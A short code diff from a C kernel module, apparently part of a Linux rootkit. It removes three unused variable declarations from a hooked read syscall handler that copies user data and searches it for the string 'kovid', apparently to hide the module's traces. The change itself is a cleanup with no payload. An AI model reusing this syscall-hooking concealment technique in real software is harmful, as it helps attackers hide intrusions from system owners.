@@ -244,9 +244,6 @@ static asmlinkage long m_read(struct pt_regs *regs) {
 
     arg = (const char __user*)PT_REGS_PARM2(regs);
     if (!copy_from_user((void *)buf, (void *)arg, size)) {
-        size_t len_to_remove;
-        int newrv;
-        char *newline;
         char *dest = strstr(buf, "kovid");
         if (!dest)
             goto out;
